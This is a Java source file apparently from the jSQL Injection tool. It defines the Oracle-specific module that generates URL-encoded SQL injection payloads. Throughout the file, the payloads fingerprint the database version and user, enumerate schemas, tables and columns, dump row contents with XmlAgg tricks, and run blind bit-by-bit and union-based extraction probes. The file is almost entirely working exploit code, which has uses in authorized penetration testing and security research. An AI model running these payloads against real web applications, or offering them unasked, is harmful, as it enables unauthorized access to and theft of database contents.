package com.jsql.model.injection.vendor;

import static com.jsql.model.accessible.DataAccess.QTE_SQL;
import static com.jsql.model.accessible.DataAccess.SEPARATOR_SQL;
import static com.jsql.model.accessible.DataAccess.TD_SQL;
import static com.jsql.model.accessible.DataAccess.TRAIL_SQL;

import java.util.ArrayList;
import java.util.List;

import com.jsql.model.MediatorModel;
import com.jsql.model.bean.database.Database;
import com.jsql.model.bean.database.Table;
import com.jsql.model.injection.strategy.Strategy;
import com.jsql.util.StringUtil;

public class OracleVendor extends AbstractVendorDefault {

    @Override
    public String sqlInfos() {
        return "SELECT+version||'"+ SEPARATOR_SQL +"'||SYS.DATABASE_NAME||'"+ SEPARATOR_SQL +"'||user||'"+ TRAIL_SQL +"'FROM+v%24instance";
    }

    @Override
    public String sqlDatabases() {
        return
            "select+" +
                "utl_raw.cast_to_varchar2(CAST(DBMS_LOB.SUBSTR(replace(" +
                    "replace(" +
                        "XmlAgg(" +
                            "XmlElement(\"a\",rawtohex('"+ SEPARATOR_SQL +"'||s||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +"'))order+by+s+nulls+last" +
                        ").getClobVal()," +
                    "'<a>','')," +
                "'<%2Fa>',rawtohex('"+ TD_SQL +"'))||rawtohex('"+ TRAIL_SQL +"'),4000,1)AS+VARCHAR(1024)))" +
                "+from(" +
                    "select+t.s+from(SELECT+DISTINCT+owner+s+"+
                        "FROM+all_tables+"+
                        ")t,(SELECT+DISTINCT+owner+s+"+
                        "FROM+all_tables+"+
                        ")t1+"+
                    "where+t.s>=t1.s+"+
                    "group+by+t.s+"+
                    "{limit}" +
                ")+";
    }

    @Override
    public String sqlTables(Database database) {
        return
            "select+" +
                "utl_raw.cast_to_varchar2(CAST(DBMS_LOB.SUBSTR(replace(" +
                    "replace(" +
                        "XmlAgg(" +
                            "XmlElement(\"a\",rawtohex('"+ SEPARATOR_SQL +"'||s||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +"'))order+by+s+nulls+last" +
                        ").getClobVal()," +
                    "'<a>','')," +
                "'<%2Fa>',rawtohex('"+ TD_SQL +"'))||rawtohex('"+ TRAIL_SQL +"'),4000,1)AS+VARCHAR(1024)))" +
                "+from(select+t.s+from(SELECT+DISTINCT+table_name+s+"+
                    "FROM+all_tables+where+owner='" + database + "'+"+
                    ")t,(SELECT+DISTINCT+table_name+s+"+
                    "FROM+all_tables+where+owner='" + database + "'+"+
                    ")t1+"+
                    "where+t.s>=t1.s+"+
                    "group+by+t.s+"+
                "{limit})+";
    }

    @Override
    public String sqlColumns(Table table) {
        return
            "select+" +
            "utl_raw.cast_to_varchar2(CAST(DBMS_LOB.SUBSTR(replace(" +
                "replace(" +
                    "XmlAgg(" +
                        "XmlElement(\"a\",rawtohex('"+ SEPARATOR_SQL +"'||s||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +"'))order+by+s+nulls+last" +
                    ").getClobVal()," +
                "'<a>','')," +
            "'<%2Fa>',rawtohex('"+ TD_SQL +"'))||rawtohex('"+ TRAIL_SQL +"'),4000,1)AS+VARCHAR(1024)))" +
            "+from(select+t.s+from(SELECT+DISTINCT+column_name+s+"+
                "FROM+all_tab_columns+where+owner='" + table.getParent() + "'and+table_name='" + table + "'"+
                ")t,(SELECT+DISTINCT+column_name+s+"+
                "FROM+all_tab_columns+where+owner='" + table.getParent() + "'and+table_name='" + table + "'"+
                ")t1+"+
                "where+t.s>=t1.s+"+
                "group+by+t.s+"+
            "{limit})+";        

    }

    @Override
    public String sqlRows(String[] columns, Database database, Table table) {
        String formatListColumn = StringUtil.join(columns, "))||'%7f'||trim(to_char(");
        formatListColumn = "trim(to_char(" + formatListColumn + "))";
        
        return
            "select+" +
            "utl_raw.cast_to_varchar2(CAST(DBMS_LOB.SUBSTR(replace(" +
                "replace(" +
                    "XmlAgg(" +
                        "XmlElement(\"a\",rawtohex('"+ SEPARATOR_SQL +"'||s||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +"'))order+by+s+nulls+last" +
                    ").getClobVal()," +
                "'<a>','')," +
            "'<%2Fa>',rawtohex('"+ TD_SQL +"'))||rawtohex('"+ TRAIL_SQL +"'),4000,1)AS+VARCHAR(1024)))" +
            "+from(select+t.s+from(SELECT+DISTINCT+" + formatListColumn + "+s+"+
                "FROM+" + database + "." + table + ""+
                ")t,(SELECT+DISTINCT+" + formatListColumn + "+s+"+
                "FROM+" + database + "." + table + ""+
                ")t1+"+
                "where+t.s>=t1.s+"+
                "group+by+t.s+"+
            "{limit})+";        
    }
    
    @Override
    public String[] getListFalseTest() {
        return new String[]{"1=0", "'a'%21='a'", "'b'%21='b'", "1=2", "1%21=1", "2%21=2"};
    }

    @Override
    public String[] getListTrueTest() {
        return new String[]{"1=1", "0=0", "'a'%21='b'", "'a'='a'", "2=2", "1%21=2"};
    }

    @Override
    public String sqlTestBlindFirst() {
        return "0%2b1=1";
    }

    @Override
    public String sqlTestBlind(String check) {
        return "+and+" + check + "--+";
    }

    @Override
    public String sqlBitTestBlind(String inj, int indexCharacter, int bit) {
        return "+and+0!=BITAND(ascii(substr(" + inj + "," + indexCharacter + ",1))," + bit + ")--+";
    }

    @Override
    public String sqlLengthTestBlind(String inj, int indexCharacter) {
        return "+and+length(" + inj + ")>" + indexCharacter + "--+";
    }

    @Override
    public String sqlBlind(String sqlQuery, String startPosition) {
        return
            "(" +
                "select+" +
                "" +
                    "'SQLi'||" +
                    "substr(" +
                        "(" + sqlQuery + ")," +
                        startPosition + "," +
                        Strategy.BLIND.instance().getPerformanceLength() +
                    ")from+dual" +
                "" +
            ")";
    }

    @Override
    public String sqlNormal(String sqlQuery, String startPosition) {
        return
            "(" +
                "select+*+from(select+" +
                    "'SQLi'||substr(" +
                        "(" + sqlQuery + ")," +
                        startPosition + "," +
                        "3996" +
                    ")from+dual)x" +
            ")";
    }

    @Override
    public String sqlCapacity(String[] indexes) {
        return
            MediatorModel.model().getIndexesInUrl().replaceAll(
                "1337(" + StringUtil.join(indexes, "|") + ")7331",
                /**
                 * rpad 1024 (not 65536) to avoid error 'result of string concatenation is too long'
                 */
                "(SELECT+TO_CHAR(" +
                    "(SELECT*" +
                    "FROM" +
                      "(SELECT'SQLi$1'" +
                        "||SUBSTR(" +
                        "(SELECT+utl_raw.cast_to_varchar2(CAST(DBMS_LOB.SUBSTR(REPLACE(REPLACE(XmlAgg(XmlElement(\"a\",rawtohex(" +
                          "s" +
                          "))" +
                        "ORDER+BY+s+nulls+last).getClobVal(),'<a>',''),'<%2fa>',rawtohex('6'))" +
                          "||rawtohex('1337'),4000,1)AS+VARCHAR(1024)))" +
                        "FROM" +
                          "(SELECT+DISTINCT+rpad('%23',1024,'%23')s+FROM+dual" +
                          ")" +
                        "),1,3996)" +
                      "FROM+dual" +
                      ")x" +
                    "))" +
                  "FROM+dual)"
            );
    }

    @Override
    public String sqlIndices(Integer nbFields) {
        List<String> fields = new ArrayList<>(); 
        for (int i = 1 ; i <= nbFields ; i++) {
            fields.add("to_char(1337"+ i +"7330%2b1)");
        }
        return "+union+select+" + StringUtil.join(fields.toArray(new String[fields.size()]), ",") + "from+dual--+";
    }

    @Override
    public String sqlOrderBy() {
        return "+order+by+1337--+";
    }

    @Override
    public String sqlLimit(Integer limitSQLResult) {
        return "+having+count(*)between+" + (limitSQLResult+1) + "+and+65536";
    }
}